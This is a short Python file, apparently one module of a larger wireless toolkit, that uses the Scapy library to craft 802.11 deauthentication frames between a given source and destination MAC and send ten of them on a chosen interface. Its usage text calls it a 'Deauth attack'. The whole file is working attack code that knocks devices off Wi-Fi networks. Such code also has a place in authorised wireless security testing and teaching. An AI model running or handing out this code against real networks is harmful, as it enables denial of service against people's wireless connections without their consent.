from scapy.all import *


def deauth_usage():
    usg = 'Runs a Deauth attack from the source to destination\n'
    usg += 'Requires: Source/Destination MAC and interface'
    print(usg)


def dot11_deauth(client, src, dst):
    l0 = RadioTap()
    l1 = Dot11(addr1=src.mac, addr2=dst.mac, addr3=dst.mac)
    l2 = Dot11Deauth(reason=2)
    pkt = l0 / l1 / l2
    pkt.show()
    sendp(pkt, iface=client.intface, count=10, inter=.2, verbose=0)
